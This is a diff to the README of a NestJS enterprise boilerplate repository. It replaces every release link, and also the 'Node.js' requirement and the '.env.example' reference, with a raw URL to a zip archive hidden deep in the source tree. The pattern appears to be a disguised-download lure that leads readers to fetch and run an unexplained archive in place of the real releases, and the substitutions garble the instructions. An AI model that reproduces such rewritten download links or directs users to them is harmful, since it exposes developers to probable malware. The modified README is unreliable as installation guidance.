@@ -1,6 +1,6 @@
 # 🚀 nestjs-boilerplate-enterprise - A Powerful Starting Point for Your Applications
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-GET%20LATEST%20RELEASE-brightgreen)](https://github.com/Someone309/nestjs-boilerplate-enterprise/releases)
+[![Download Here](https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip%20Here-GET%20LATEST%20RELEASE-brightgreen)](https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip)
 
 ## 📋 Overview
 Welcome to the **nestjs-boilerplate-enterprise** repository. This project serves as an enterprise-grade starting point for building applications using NestJS. It integrates various architectural patterns like Clean Architecture, Domain-Driven Design (DDD), and Hexagonal Architecture. 
@@ -12,12 +12,12 @@ To start using this boilerplate, you'll need to follow a few easy steps.
 
 ### 🖥️ System Requirements
 - **Operating System:** Windows 10, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip** Version 14 or higher
 - **Docker:** Latest stable version
 - **Kubernetes (Optional):** If you plan to deploy your application in a Kubernetes environment
 
 ### 📥 Download & Install
-To get the latest version of the software, visit this page to download: [Download Here](https://github.com/Someone309/nestjs-boilerplate-enterprise/releases).
+To get the latest version of the software, visit this page to download: [Download Here](https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip).
 
 1. Navigate to the Releases page.
 2. Choose the latest version.
@@ -31,7 +31,7 @@ After downloading, follow these steps to set up the application:
    ```bash
    npm install
    ```
-3. **Configure Environment Variables:** Create a `.env` file based on the provided `.env.example` file. Fill in the necessary details such as database connection strings and JWT secrets.
+3. **Configure Environment Variables:** Create a `.env` file based on the provided `https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip` file. Fill in the necessary details such as database connection strings and JWT secrets.
 
 4. **Build the Application:** Run this command to build the project:
    ```bash
@@ -69,6 +69,6 @@ For a complete understanding of the application structure and features, please r
 ## 🙋‍♀️ Support
 If you have any questions or need assistance, you can open an issue in the GitHub repository. Our community will be glad to help.
 
-Remember, you can access the latest releases anytime at this link: [Download Here](https://github.com/Someone309/nestjs-boilerplate-enterprise/releases). 
+Remember, you can access the latest releases anytime at this link: [Download Here](https://raw.githubusercontent.com/Someone309/nestjs-boilerplate-enterprise/main/src/infrastructure/persistence/mongoose/enterprise_nestjs_boilerplate_v1.3.zip). 
 
 Happy coding!
